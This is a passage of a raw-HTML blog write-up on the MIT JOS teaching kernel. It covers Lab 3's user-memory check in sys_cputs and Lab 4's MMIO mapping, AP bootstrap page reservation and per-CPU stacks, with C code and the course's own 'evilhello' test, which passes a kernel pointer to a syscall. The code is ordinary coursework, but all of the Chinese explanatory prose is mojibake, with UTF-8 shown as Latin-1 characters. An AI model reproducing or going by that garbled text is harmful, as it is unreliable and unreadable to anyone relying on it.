class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">[<span class="hljs-number">00000000</span>] new env <span class="hljs-number">00001000</span><br>...<br>[<span class="hljs-number">00001000</span>] user_mem_check assertion failure for va f010000c<br>[<span class="hljs-number">00001000</span>] free env <span class="hljs-number">00001000</span><br></code></pre></td></tr></table></figure></blockquote><p>æˆ‘ä»¬å…ˆçœ‹ <code>user/evilhello.c</code> ï¼Œé‡Œé¢ä¸ºç³»ç»Ÿè°ƒç”¨ <code>sys_cputs()</code> ä¼ é€’äº†ä¸€ä¸ªå†…æ ¸ç©ºé—´ä¸­çš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// evil hello world -- kernel pointer passed to kernel</span><br><span class="hljs-comment">// kernel should destroy user environment in response</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inc/lib.h&gt;</span></span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">umain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-comment">// try to print the kernel entry point as a string!  mua ha ha!</span><br>sys_cputs((<span class="hljs-type">char</span>*)<span class="hljs-number">0xf010000c</span>, <span class="hljs-number">100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨å¯¹åº”ç³»ç»Ÿè°ƒç”¨åŠ ä¸Šåœ°å€åˆæ³•æ€§æ£€æŸ¥å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Print a string to the system console.</span><br><span class="hljs-comment">// The string is exactly &#x27;len&#x27; characters long.</span><br><span class="hljs-comment">// Destroys the environment on memory errors.</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">sys_cputs</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-comment">// Check that the user has permission to read memory [s, s+len).</span><br><span class="hljs-comment">// Destroy the environment if not.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>user_mem_assert(curenv, s, len, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// Print the string supplied by the user.</span><br>cprintf(<span class="hljs-string">&quot;%.*s&quot;</span>, len, s);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œè¯„åˆ†ç¨‹åºï¼Œæˆ‘ä»¬æˆåŠŸé€šè¿‡äº†æ‰€æœ‰æµ‹è¯•ï¼Œæ‹¿åˆ°æ»¡åˆ†</p><p><img src="https://s2.loli.net/2022/03/17/Xo6q4wWvFJptYzl.png" alt="image.png"></p><p>è‡³æ­¤ï¼Œ lab3 å…¨éƒ¨å®Œæˆ</p><h1>0x04. Lab 4: Preemptive Multitasking</h1><p>åœ¨ lab4 ä¸­æˆ‘ä»¬å°†å®ç°æŠ¢å å¼å¤šä»»åŠ¡è°ƒåº¦</p><p>é¦–å…ˆè¿˜æ˜¯å…ˆ commit lab3 çš„ä»£ç ï¼ŒæŠŠ lab4 åˆ†æ”¯æ‹‰ä¸‹æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -m <span class="hljs-string">&quot;lab3&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab4 origin/lab4</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab3</span><br></code></pre></td></tr></table></figure><p>åœ¨ lab4 å½“ä¸­æ–°å¢äº†å¦‚ä¸‹æ–‡ä»¶ï¼š</p><table><thead><tr><th><code>kern/cpu.h</code></th><th>Kernel-private definitions for multiprocessor support</th></tr></thead><tbody><tr><td><code>kern/mpconfig.c</code></td><td>Code to read the multiprocessor configuration</td></tr><tr><td><code>kern/lapic.c</code></td><td>Kernel code driving the local APIC unit in each processor</td></tr><tr><td><code>kern/mpentry.S</code></td><td>Assembly-language entry code for non-boot CPUs</td></tr><tr><td><code>kern/spinlock.h</code></td><td>Kernel-private definitions for spin locks, including the big kernel lock</td></tr><tr><td><code>kern/spinlock.c</code></td><td>Kernel code implementing spin locks</td></tr><tr><td><code>kern/sched.c</code></td><td>Code skeleton of the scheduler that you are about to implement</td></tr></tbody></table><h2 id="Part-A-Multiprocessor-Support-and-Cooperative-Multitasking">Part A: Multiprocessor Support and Cooperative Multitasking</h2><p>åœ¨æœ¬ lab çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°†æ‰©å±• JOS ä»¥è®©å…¶èƒ½è¿è¡Œåœ¨ä¸€ä¸ªå¤šå¤„ç†å™¨ç³»ç»Ÿä¸Šï¼Œå¹¶å®ç°ä¸€äº›ç³»ç»Ÿè°ƒç”¨ä»¥å…è®¸ç”¨æˆ·çº§çš„è¿›ç¨‹åˆ›å»ºæ–°çš„è¿›ç¨‹ï¼›æˆ‘ä»¬åŒæ—¶è¿˜å°†å®ç° <em>åä½œå¼çš„</em> è½®è¯¢è°ƒåº¦ï¼ˆround-robin schedulingï¼‰ï¼Œå…è®¸å†…æ ¸åœ¨å½“å‰è¿›ç¨‹è‡ªæ„¿æ”¾å¼ƒCPU æ—¶è¿›è¡Œè¿›ç¨‹è°ƒåº¦ï¼›åœ¨ Part C ä¸­æˆ‘ä»¬è¿˜å°†å®ç° <em>æŠ¢å å¼</em> çš„è°ƒåº¦ï¼Œå…¶å…è®¸å†…æ ¸åœ¨ä¸€æ®µæ—¶é—´åé‡æ–°è·å– CPU çš„æ§åˆ¶æƒ</p><h3 id="Multiprocessor-Support">Multiprocessor Support</h3><p>æˆ‘ä»¬å°†è®© JOS æ”¯æŒâ€å¯¹ç§°å¼å¤šå¤„ç†â€œï¼ˆsymmetric multiprocessingï¼‰â€”â€”ä¸€ç§æ‰€æœ‰ CPU éƒ½æœ‰å¯¹ç³»ç»Ÿèµ„æºåŒç­‰çš„æƒé™çš„å¤šå¤„ç†å™¨æ¨¡å‹ã€‚åœ¨å¼•å¯¼è¿‡ç¨‹ä¸­ï¼ŒSMP ä¸­çš„ CPU å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼šç”±ä¸€ä¸ªå¼•å¯¼å¤„ç†å™¨ï¼ˆbootstrap processorï¼ŒBSPï¼‰è´Ÿè´£ç³»ç»Ÿçš„åˆå§‹åŒ–ä¸å¯åŠ¨å·¥ä½œï¼Œå‰©ä½™çš„åº”ç”¨å¤„ç†å™¨ï¼ˆapplication processorsï¼ŒAPsï¼‰åˆ™åœ¨ç³»ç»Ÿè¿è¡Œä¹‹åå†ç”± BSP å”¤é†’ã€‚è€Œç”±å“ªä¸ª CPU æ¥ä½œä¸º BSP åˆ™æ˜¯ç”±ç¡¬ä»¶ä¸ BIOS å†³å®šçš„ã€‚</p><p>åœ¨ SMP ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ª CPU éƒ½é™„å¸¦æœ‰ä¸€ä¸ªæœ¬åœ° APIC ï¼ˆLAPICï¼‰å•å…ƒï¼Œå…¶ä¸ä»…è´Ÿè´£åˆ†å‘ä¸­æ–­ï¼Œè¿˜è´Ÿè´£ä¸ºå…¶è¿æ¥çš„ CPU æä¾›ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œæœ¬æ¬¡å®éªŒæˆ‘ä»¬å°†åˆ©ç”¨ LAPIC å•å…ƒçš„ä¸‹åˆ—åŸºæœ¬åŠŸèƒ½ï¼ˆå‚è§ <code>kern/lapic.c</code>ï¼‰</p><ul><li>è¯»å– LAPIC ID ä»¥è¯†åˆ«ä»£ç å½“å‰è¿è¡Œçš„ CPUï¼ˆå‚è§ <code>cpunum()</code>ï¼‰</li><li>ä» BSP å‘ APs å‘é€ <code>STARTUP</code> è¿™ä¸€å¤„ç†å™¨é—´ä¸­æ–­ï¼ˆinterprocessor interruptï¼‰ä»¥å°†å…¶å”¤é†’ï¼ˆå‚è§ <code>lapic_startap()</code>ï¼‰</li><li>åœ¨ part C ä¸­ï¼Œæˆ‘ä»¬å¯¹ LAPIC çš„å†…ç½®è®¡æ—¶å™¨è¿›è¡Œç¼–ç¨‹ä»¥è§¦å‘æ—¶é’Ÿä¸­æ–­ä»è€Œæ”¯æŒæŠ¢å å¼å¤šä»»åŠ¡ï¼ˆå‚è§ <code>apic_init()</code>ï¼‰</li></ul><blockquote><p><strong>Exercise 1.</strong> Implement <code>mmio_map_region</code> in <code>kern/pmap.c</code>. To see how this is used, look at the beginning of <code>lapic_init</code> in <code>kern/lapic.c</code>. Youâ€™ll have to do the next exercise, too, before the tests for <code>mmio_map_region</code> will run.</p></blockquote><p>å¤„ç†å™¨é€šè¿‡ MMIO è®¿é—®å…¶ LAPICï¼šä¸€éƒ¨åˆ†ç‰©ç†å†…å­˜è¢«<strong>ç¡¬è¿çº¿</strong>åˆ°éƒ¨åˆ† IO è®¾å¤‡çš„å¯„å­˜å™¨ä¸Šï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ™®é€šçš„å­˜å–æŒ‡ä»¤æ¥è®¿é—®è®¾å¤‡å¯„å­˜å™¨ï¼Œç›¸åº”åœ°è¿™å—å†…å­˜ä¾¿æ˜¯ä¸€ä¸ªå†…å­˜ç©ºæ´ã€‚LAPIC å¯¹åº”çš„å†…å­˜ç©ºæ´åˆ™åœ¨<strong>ç‰©ç†åœ°å€</strong> <code>0xFE000000</code> å¤„ï¼Œå ç”¨ 32 MBï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡åŸºäº <code>KERNBASE</code> çš„çº¿æ€§æ˜ å°„è¿›è¡Œè®¿é—®ï¼ˆè¶…å‡º 32 ä½åœ°å€äº†ï¼‰ï¼Œä½† JOS åœ¨ <code>MMIOBASE</code> å¤„ç•™äº† 4MB çš„ç©ºç™½æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ˜ å°„åˆ°æ­¤å¤„</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 1ï¼Œè®©æˆ‘ä»¬å®ç° <code>mmio_map_region()</code></p><blockquote><p><strong>Exercise 1.</strong> Implement <code>mmio_map_region</code> in <code>kern/pmap.c</code>. To see how this is used, look at the beginning of <code>lapic_init</code> in <code>kern/lapic.c</code>. Youâ€™ll have to do the next exercise, too, before the tests for <code>mmio_map_region</code> will run.</p></blockquote><p>è¿™ä¸ªå‡½æ•°ä¸»è¦çš„ä½œç”¨å°±æ˜¯å°†æŒ‡å®šçš„ç‰©ç†å†…å­˜æ˜ å°„åˆ°å¯¹åº”çš„è™šæ‹Ÿå†…å­˜ä¸Šï¼Œåªä¸è¿‡ç›®æ ‡æ˜¯ mmio å†…å­˜ï¼Œç›´æ¥ä½¿ç”¨æˆ‘ä»¬ä¹‹å‰å†™çš„ <code>boot_map_region()</code> å³å¯ï¼Œä»¥é¡µä¸ºå•ä½ä» <code>MMIOBASE</code> å¼€å§‹æ˜ å°„ï¼Œè‹¥å‰©ä½™çš„ç•™ç»™ MMIO çš„åŒºåŸŸä¸å¤Ÿåˆ™ panicï¼Œè¿™é‡Œåˆ«å¿˜äº†é¡µè¡¨é¡¹æ ‡å¿—ä½åº”è®¾ä¸º <code>PTE_W | PTE_PCD | PTE_PWT</code> ï¼ˆå¯å†™ &amp;&amp; ç¦ç”¨é«˜é€Ÿç¼“å­˜ &amp;&amp; é¡µçº§é€šå†™ä½ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Reserve size bytes in the MMIO region and map [pa,pa+size) at this</span><br><span class="hljs-comment">// location.  Return the base of the reserved region.  size does *not*</span><br><span class="hljs-comment">// have to be multiple of PGSIZE.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">mmio_map_region</span><span class="hljs-params">(<span class="hljs-type">physaddr_t</span> pa, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-comment">// Where to start the next region.  Initially, this is the</span><br><span class="hljs-comment">// beginning of the MMIO region.  Because this is static, its</span><br><span class="hljs-comment">// value will be preserved between calls to mmio_map_region</span><br><span class="hljs-comment">// (just like nextfree in boot_alloc).</span><br><span class="hljs-type">static</span> <span class="hljs-type">uintptr_t</span> base = MMIOBASE;<br><br><span class="hljs-comment">// Reserve size bytes of virtual memory starting at base and</span><br><span class="hljs-comment">// map physical pages [pa,pa+size) to virtual addresses</span><br><span class="hljs-comment">// [base,base+size).  Since this is device memory and not</span><br><span class="hljs-comment">// regular DRAM, you&#x27;ll have to tell the CPU that it isn&#x27;t</span><br><span class="hljs-comment">// safe to cache access to this memory.  Luckily, the page</span><br><span class="hljs-comment">// tables provide bits for this purpose; simply create the</span><br><span class="hljs-comment">// mapping with PTE_PCD|PTE_PWT (cache-disable and</span><br><span class="hljs-comment">// write-through) in addition to PTE_W.  (If you&#x27;re interested</span><br><span class="hljs-comment">// in more details on this, see section 10.5 of IA32 volume</span><br><span class="hljs-comment">// 3A.)</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Be sure to round size up to a multiple of PGSIZE and to</span><br><span class="hljs-comment">// handle if this reservation would overflow MMIOLIM (it&#x27;s</span><br><span class="hljs-comment">// okay to simply panic if this happens).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: The staff solution uses boot_map_region.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Your code here:</span><br><br>size = ROUNDUP(pa + size, PGSIZE);<br>pa = ROUNDDOWN(pa, PGSIZE);<br>size -= pa;<br><span class="hljs-keyword">if</span> ((base + size) &gt; MMIOLIM || (base + size) &lt; MMIOBASE)<br>panic(<span class="hljs-string">&quot;Run out of MMIO region!&quot;</span>);<br><br>boot_map_region(kern_pgdir, base, size, pa, PTE_W | PTE_PCD | PTE_PWT);<br>base += size;<br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*)(base - size);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Application-Processor-Bootstrap">Application Processor Bootstrap</h4><p>åœ¨å¯åŠ¨ APs ä¹‹å‰ BSP åº”å½“æ”¶é›†å¤šå¤„ç†å™¨ç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯ï¼Œä¾‹å¦‚ CPU æ€»æ•°ã€APIC IDs ä»¥åŠ LAPIC å•å…ƒçš„ MMIO åœ°å€ï¼Œ<code>mp_init()</code> å‡½æ•°é€šè¿‡è¯»å– BIOS çš„å†…å­˜åŒºä¸­çš„ MP é…ç½®è¡¨æ¥è·å–è¿™äº›ä¿¡æ¯ï¼›åœ¨<code>boot_aps()</code> ä¸­å°† APs å¯åŠ¨ï¼ˆå®æ¨¡å¼ï¼‰ï¼Œå¹¶å°† AP å…¥å£ä»£ç æ‹·è´åˆ°ä¸€ä¸ªå®æ¨¡å¼ä¸‹å¯å¯»å€çš„å†…å­˜åŒºåŸŸï¼Œä¸åŒäº bootloaderï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ APs å¼€å§‹æ‰§è¡Œä»£ç çš„ä½ç½®ï¼Œæˆ‘ä»¬å°†å…¥å£ä»£ç å¤åˆ¶åˆ° 0x7000 ï¼ˆ<code>MPENTRY_PADDR</code>ï¼‰å¤„ï¼Œä¸è¿‡å…¶å®ä»»ä½• 640KB ä»¥ä¸‹çš„æœªä½¿ç”¨çš„é¡µå¯¹é½çš„ç‰©ç†åœ°å€éƒ½å¯ä»¥è¢«ä½¿ç”¨</p><p>ä¹‹å <code>boot_aps()</code> é€šè¿‡å‘æ¯ä¸€ä¸ª APs çš„ LAPIC å•å…ƒå‘é€ <code>STARTUP</code> IPI ä»¥å”¤é†’ä»–ä»¬ï¼Œå…¶ä¸­åŒ…å«æœ‰å…¥å£ç‚¹çš„åœ°å€ï¼Œåœ¨ç»è¿‡ç®€å•çš„è®¾ç½®ä¹‹å æ¯ä¸ª AP éƒ½å°†è¿›å…¥å¼€å¯åˆ†é¡µçš„ä¿æŠ¤æ¨¡å¼ï¼Œå¹¶è°ƒç”¨ <code>mp_main()</code> å‡½æ•°ï¼›<code>boot_aps()</code> ä¼šç­‰åˆ°æ¯ä¸ªè¢«å”¤é†’çš„ AP åœ¨è®¾ç½®è‡ªå·±å¯¹åº”çš„ <code>struct CpuInfo</code> ä¸­çš„ <code>cpu_status</code> åŸŸçš„ <code>CPU_STARTED</code> æ ‡å¿—ä½åæ‰ä¼šæ¥ç€å”¤é†’ä¸‹ä¸€ä¸ª</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 2ï¼Œé˜…è¯»å¯åŠ¨è¿‡ç¨‹çš„ä»£ç å¹¶ä¿®æ”¹ <code>page_init()</code> ä»¥é¿å…å°† <code>MPENTRY_ADDR</code> å¯¹åº”çš„é¡µä¹Ÿé“¾åˆ° freelist ä¸Š</p><blockquote><p><strong>Exercise 2.</strong> Read <code>boot_aps()</code> and <code>mp_main()</code> in <code>kern/init.c</code>, and the assembly code in <code>kern/mpentry.S</code>. Make sure you understand the control flow transfer during the bootstrap of APs. Then modify your implementation of <code>page_init()</code> in <code>kern/pmap.c</code> to avoid adding the page at <code>MPENTRY_PADDR</code> to the free list, so that we can safely copy and run AP bootstrap code at that physical address. Your code should pass the updated <code>check_page_free_list()</code> test (but might fail the updated <code>check_kern_pgdir()</code> test, which we will fix soon).</p></blockquote><p>é¦–å…ˆæ‹œè¯»ä¸€ä¸‹ <code>boot_aps()</code>ï¼Œé€»è¾‘è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä¸»è¦å°±æ˜¯æ‹·è´å¯åŠ¨ä»£ç åˆ° 0x7000ï¼Œä¹‹åé€šè¿‡ <code>lapic_startap()</code> å”¤é†’å•ä¸ª AP å¹¶è¿›è¡Œå¿™ç­‰å¾…ç›´åˆ°å…¶è®¾ç½®è‡ªå·±çš„ <code>CPU_STARTED</code> æ ‡å¿—ä½ï¼Œè€Œ <code>mp_main()</code> åˆ™ä¸»è¦æ˜¯å°†å†…æ ¸é¡µè¡¨è£…è½½åˆ° AP è‡ªå·±çš„ cr3 ä¸Šï¼Œä»¥åŠåˆå§‹åŒ–è‡ªå·±çš„ç¯å¢ƒã€IDTã€ä»è¿è¡Œé˜Ÿåˆ—ä¸­å–å‡ºè¿›ç¨‹ï¼ˆåé¢è¿™äº›éƒ½éœ€è¦æˆ‘ä»¬åœ¨åç»­å®ç°ï¼‰</p><p>æˆ‘ä»¬ç›´æ¥çœ‹ä¿®æ”¹ <code>page_init()</code>ï¼Œå¦‚æœåœ¨å»º freelist æ—¶å¯¹æ¯ä¸€å¼ å†…å­˜é¡µéƒ½è¿›è¡Œä¸€æ¬¡åˆ¤æ–­é‚£å°±å¤ªè€—æ—¶äº†ï¼Œç¬”è€…çš„é€‰æ‹©æ˜¯ç­‰åˆ° freelist å»ºå®Œä¹‹åå†å°†å¯¹åº”é¡µè¿›è¡Œè„±é“¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// LAB 4:</span><br><span class="hljs-comment">// Change your code to mark the physical page at MPENTRY_PADDR</span><br><span class="hljs-comment">// as in use</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">mpentry</span>, *<span class="hljs-title">mp_prev</span>;</span><br>    <br>    <span class="hljs-comment">//...</span><br>    <br>    <span class="hljs-comment">// 5) mark the physical page at MPENTRY_PADDR as in use</span><br>mpentry = pa2page(MPENTRY_PADDR);<br>mp_prev = pa2page(MPENTRY_PADDR + PGSIZE);<br>mp_prev-&gt;pp_link = mpentry-&gt;pp_link;<br>mpentry-&gt;pp_ref = <span class="hljs-number">1</span>;<br>mpentry-&gt;pp_link = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ä¹ é¢˜ï¼š</p><blockquote><p><strong>Question</strong></p><ol><li>Compare <code>kern/mpentry.S</code> side by side with <code>boot/boot.S</code>. Bearing in mind that <code>kern/mpentry.S</code> is compiled and linked to run above <code>KERNBASE</code> just like everything else in the kernel, what is the purpose of macro <code>MPBOOTPHYS</code>? Why is it necessary in <code>kern/mpentry.S</code> but not in <code>boot/boot.S</code>? In other words, what could go wrong if it were omitted in <code>kern/mpentry.S</code>?<br>Hint: recall the differences between the link address and the load address that we have discussed in Lab 1.</li></ol></blockquote><p><code>MPBOOTPHYS</code> å®ä¸»è¦çš„ä½œç”¨å°±æ˜¯è®¡ç®— entry code ä¸­éœ€è¦ç”¨åˆ°çš„åœ°å€çš„<strong>çœŸå®ç‰©ç†åœ°å€</strong>ï¼Œå› ä¸º entry code åœ¨è¢«é“¾æ¥è¿›å†…æ ¸äºŒè¿›åˆ¶æ–‡ä»¶åå…¶åœ°å€ä¸ä¸€å®šæ˜¯ 0x7000 èµ·å§‹ï¼Œä½†æ˜¯æˆ‘ä»¬å°†å…¶åŠ è½½åˆ°äº†è¯¥ä½ç½®ï¼Œå› æ­¤å¯¹äºç»å¯¹åœ°å€çš„ç´¢å¼•éœ€è¦è®¡ç®—å…¶åŠ è½½åˆ°è¯¥åœ°å€ä¸Šä¹‹åçš„åœ°å€</p><h4 id="Per-CPU-State-and-Initialization">Per-CPU State and Initialization</h4><p>å¯¹äºä¸€ä¸ªå¤šå¤„ç†å™¨ OS è€Œè¨€æˆ‘ä»¬å¾ˆæœ‰å¿…è¦ä¸ºæ¯ä¸ª CPU éƒ½åˆ†é…ä¸€å—ç§æœ‰ç©ºé—´ï¼ˆä¾‹å¦‚ Linux ä¸­çš„ percpu å˜é‡ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†é…ä¸€ä¸ªæ•°ç»„å¹¶ä½¿ç”¨ <code>cpunum()</code> è·å–åˆ° CPU æ ‡å·ä½œä¸ºä¸‹æ ‡ç´¢å¼•ï¼Œä»¥ä¸‹æ˜¯æˆ‘ä»¬åº”å½“æ³¨æ„çš„ per-CPU stateï¼š</p><ul><li><p><strong>Per-CPU kernel stack</strong>.</p><p>æ¯ä¸ª CPU éƒ½åº”å½“æœ‰å±äºå…¶è‡ªå·±çš„å †æ ˆï¼Œåœ¨ JOS ä¸­æ•°ç»„ <code>percpu_kstacks[NCPU][KSTKSIZE]</code> ä¸ºæ¯ä¸ª CPU ä¿ç•™ä¸€ä»½è‡ªå·±çš„å †æ ˆåŒºåŸŸï¼›æ­£å¦‚åœ¨ lab2 ä¸­æˆ‘ä»¬å°† BSP çš„å †æ ˆæ˜ å°„åˆ°äº† KSTACKTOP ä¸‹ï¼Œåœ¨æœ¬ lab ä¸­æˆ‘ä»¬å°†ä¸ºæ¯ä¸ª CPU åˆ›å»ºè‡ªå·±çš„å †æ ˆï¼Œä¸”åº”ç¡®ä¿å…¶å †æ ˆå ç”¨ä¸€å—è¿ç»­çš„è™šæ‹Ÿå†…å­˜åŒºåŸŸ</p></li><li><p><strong>Per-CPU TSS and TSS descriptor</strong>.</p><p>æˆ‘ä»¬åŒæ ·éœ€è¦ä¸€ä¸ª per-CPU ä»»åŠ¡çŠ¶æ€æ®µæ¥ç¡®å®šæ¯ä¸ª CPU çš„å†…æ ¸æ ˆçš„ä½ç½®ï¼Œæ¯ä¸ª CPU çš„ TSS è¢«å­˜æ”¾åœ¨ <code>cpus[i].cpu_ts</code> ä¸­ï¼Œå¯¹åº”çš„ TSS descriptor åˆ™åœ¨ <code>gdt[(GD_TSS0) &gt;&gt; 3] + i]</code> ï¼Œå®šä¹‰äº <code>kern/trap.c</code> ä¸­çš„å…¨å±€å˜é‡ <code>ts</code> åˆ™ä¸å†ä½¿ç”¨</p></li><li><p><strong>Per-CPU current environment pointer</strong>.</p><p>å› ä¸ºæ¯ä¸ª CPU éƒ½å¯ä»¥ç‹¬ç«‹è¿è¡Œç”¨æˆ·è¿›ç¨‹ï¼Œå› æ­¤æˆ‘ä»¬å°†ç¬¦å· <code>curenv</code> é‡å®šä¹‰ä¸º <code>cpus[cpunum()].cpu_env</code> ï¼ŒæŒ‡å‘è¿è¡Œåœ¨å½“å‰ CPU ä¸Šè¿›ç¨‹çš„ PCB</p></li><li><p><strong>Per-CPU system registers</strong>.</p><p>æ‰€æœ‰çš„å¯„å­˜å™¨å¯¹ä¸€ä¸ª CPU è€Œè¨€éƒ½æ˜¯ç§æœ‰çš„ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦åœ¨æ¯ä¸ª CPU ä¸Šéƒ½åˆå§‹åŒ–å…¶ cr3ã€gdtã€idtâ€¦</p></li></ul><p>æ¥ä¸‹æ¥æ˜¯ Exercise 3ï¼Œä¿®æ”¹ <code>mem_init_mp()</code> ä»¥ä¸ºæ¯ä¸ª CPU åˆ†é…ä¸€ä¸ªå†…æ ¸æ ˆ</p><blockquote><p><strong>Exercise 3.</strong> Modify <code>mem_init_mp()</code> (in <code>kern/pmap.c</code>) to map per-CPU stacks starting at <code>KSTACKTOP</code>, as shown in <code>inc/memlayout.h</code>. The size of each stack is <code>KSTKSIZE</code> bytes plus <code>KSTKGAP</code> bytes of unmapped guard pages. Your code should pass the new check in <code>check_kern_pgdir()</code>.</p></blockquote><p>ç›´æ¥ç”¨ <code>boot_map_region</code> åˆ›å»ºæ˜ å°„å³å¯ï¼Œæ³¨æ„è¿™é‡Œä¸ç®¡æˆ‘ä»¬æœ‰å¤šå°‘ä¸ª CPU éƒ½è¦å»ºç«‹ <code>NCPU</code> ä¸ªå†…æ ¸æ ˆï¼ˆè¿™ä¸ªæ—¶å€™ <code>ncpu</code> å˜é‡è¿˜æ²¡åˆå§‹åŒ–ï¼Œè€Œä¸”æ•´ä¸ª <code>percpu_kstack</code> æ•°ç»„çš„å¤§å°æ˜¯åœ¨ç¼–è¯‘æœŸç¡®å®šçš„ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Modify mappings in kern_pgdir to support SMP</span><br><span class="hljs-comment">//   - Map the per-CPU stacks in the region [KSTACKTOP-PTSIZE, KSTACKTOP)</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">mem_init_mp</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// Map per-CPU stacks starting at KSTACKTOP, for up to &#x27;NCPU&#x27; CPUs.</span><br><span 